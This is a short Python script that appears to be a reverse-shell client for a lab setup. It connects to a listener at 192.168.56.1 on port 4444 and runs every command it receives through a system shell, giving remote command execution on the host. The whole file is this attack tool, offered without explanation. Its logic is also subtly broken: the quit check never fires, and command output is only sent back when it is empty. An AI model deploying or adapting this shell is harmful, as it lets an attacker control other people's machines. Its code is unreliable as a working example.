import sys
import socket
import subprocess

SERVER_IP = "192.168.56.1"
PORT = 4444

# socket.getaddrinfo("192.168.56.1", 8080)

s = socket.socket()
s.connect((SERVER_IP, PORT))
mgs = s.recv(1024).decode()
print("[*] server :", mgs)


while True:
    cmd = s.recv(1024).decode()
    print(f"[+] recived command: {cmd}")
    if cmd.lower in ["q", "x", "quit", "exit"]:
        break

    try:
        results = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        results = str(e).encode()

    if len(results) == 0:
        results = "[+] executed successfully ".encode()
        s.send(results)


s.close()
